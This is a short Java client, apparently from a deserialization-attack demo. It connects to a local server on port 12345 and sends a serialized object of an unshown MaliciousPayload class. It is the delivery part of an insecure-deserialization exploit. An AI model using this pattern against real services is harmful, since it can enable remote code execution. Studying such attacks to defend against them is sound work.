import java.io.*;
import java.net.*;

public class MaliciousClient {
    public static void main(String[] args) {
        try (Socket socket = new Socket("localhost", 12345);
             ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {
            
            MaliciousPayload payload = new MaliciousPayload();
            oos.writeObject(payload);
            System.out.println("Malicious payload sent.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}